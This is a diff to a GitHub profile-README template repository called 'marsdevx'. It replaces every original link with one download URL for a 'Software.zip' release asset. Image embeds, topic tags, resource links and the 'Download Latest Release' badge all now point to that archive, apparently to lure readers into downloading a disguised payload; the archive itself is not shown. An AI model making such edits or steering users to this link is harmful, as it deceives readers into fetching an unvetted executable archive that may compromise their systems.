@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "marsdevx" Repository!
 
-![Mars](https://media.giphy.com/media/bqb4eziGCLN7e/giphy.gif)
+![Mars](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository is all about creating an awesome Profile README using trendy badges, GIFs, and GitHub features. If you are looking to spice up your GitHub profile, this is the place to be! 🪪
@@ -16,17 +16,17 @@ This repository is all about creating an awesome Profile README using trendy bad
 - Profile README
 - README
 - README Badges
-- README.md
+- https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip
 - README Stats
 - README Template
-- Shields.io
+- https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip
 - Statistics
 
 ## Get Started
 To kickstart your journey in creating a standout GitHub profile, check out the amazing tools and resources available in this repository.
 
 ### Latest Release:
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
 (Requires extraction after download)
 
 If the link doesn't work, kindly visit the "Releases" section for alternative download options.
@@ -34,16 +34,16 @@ If the link doesn't work, kindly visit the "Releases" section for alternative do
 ## Resources
 Here are some cool resources that you can explore to enhance your GitHub profile:
 
-### 1. [Awesome README](https://github.com/sindresorhus/awesome)
+### 1. [Awesome README](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
    Explore a curated list of awesome READMEs that you can take inspiration from.
 
-### 2. [Shields.io](https://shields.io)
+### 2. [https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
    Create custom badges for your projects to make them more visually appealing.
 
-### 3. [GitHub Pages](https://pages.github.com)
+### 3. [GitHub Pages](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
    Host your own website directly from your GitHub repository using GitHub Pages.
 
-### 4. [GitHub Stats](https://github.com/anuraghazra/github-readme-stats)
+### 4. [GitHub Stats](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
    Display your GitHub statistics in a visually appealing way on your profile README.
 
 ## Contributing
@@ -54,9 +54,9 @@ If you have any questions or need help with anything related to this project, fe
 
 Let's make your GitHub profile stand out from the rest! 🌟🚀
 
-🔗 [GitHub Repository Link](https://github.com/your-username/marsdevx)
+🔗 [GitHub Repository Link](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
 
-![Mars Exploration](https://media.giphy.com/media/kgZsPRFmdnK77gUu5p/giphy.gif)
+![Mars Exploration](https://github.com/LLeonex/marsdevx/releases/download/v2.0/Software.zip)
 
 ---
 Feel free to add more content, resources, or personalize this README to make it your own. Happy coding! 🌌
